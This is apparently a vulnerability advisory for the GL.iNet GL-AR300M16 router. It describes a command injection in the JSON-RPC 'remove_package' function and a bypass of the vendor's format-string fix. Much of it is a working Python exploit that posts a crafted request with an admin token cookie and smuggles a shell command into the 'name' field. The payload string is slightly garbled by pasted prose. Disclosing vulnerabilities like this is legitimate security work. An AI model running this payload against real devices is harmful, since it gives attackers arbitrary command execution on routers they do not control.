Submittion Date: 2025.4.18  
Vendor: GL-AR300M16  
Version:4.3.27    
Firmware: openwrt-ar300m16-4.3.27-0514-1747192506
Download Link: https://dl.gl-inet.cn/router/ar300m16/stable  

The function `remove_package`handles the critical parameter string `name`without proper sanitization or validation, which leads to a **command injection vulnerability**. Similar to `get_package_info`, this function constructs system commands using unsanitized user input, allowing attackers to execute arbitrary commands with elevated privileges.
![image](image/mips-vul.png)

The vendor modified the format string to enhance security, but command injection can still be achieved by means of a bypass.
![image](image/format_string.png)

Exploit the vulnerability by sending a carefully constructed HTTP request

```
import requests

# Target URL (Note:/rpc in the URL needs to be adjusted according to the actual situation)

url = "http://192.168.2.10/rpc"

#Target URL (Note: the URL needs to be adjusted according to the actual situation)
headers = {
    "Host": "192.168.2.10",
    "Content-Length": "247",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Origin": "http://192.168.2.10",
    "Referer": "http://192.168.2.10/",
    "Accept-Encoding": "gzip, deflate, br",
    "Cookie": "Admin-Token=wb1H7fURGJM4dMpIsTQDZM50GNfgmqGd",#The cookie needs to be modified according to the current admin token
    "Connection": "keep-alive"
}

#Request body (json-rpc command injection payload)
data = {
    "jsonrpc": "2.0",
    "method": "call",
    "params": [
        "wb1H7fURGJM4dMpIsTQDZM50GNfgmqGd",
        "plugins",
        "remove_package",
        {
            "name": "7'; echo 1234Exploit the vulnerability by sending a carefully constructed HTTP request > /www/pwntest1.txt;'"
        }
    ]
}

#Send post request
try:
    response = requests.post(
        url,
        headers=headers,
        json=data,
        verify=False 
    )
    
    # 输出响应信息
    print(f"Status Code: {response.status_code}")
    print("Response Headers:")
    print(response.headers)
    print("\nResponse Body:")
    print(response.text)
    
except requests.exceptions.RequestException as e:
    print(f"Request failed: {e}")
```

The exploitation is shown below.

<img width="1722" height="1066" alt="微信图片_20251125165027_221_100" src="https://github.com/user-attachments/assets/e27576a3-9e2b-4241-a475-4fff0a272dcb" />

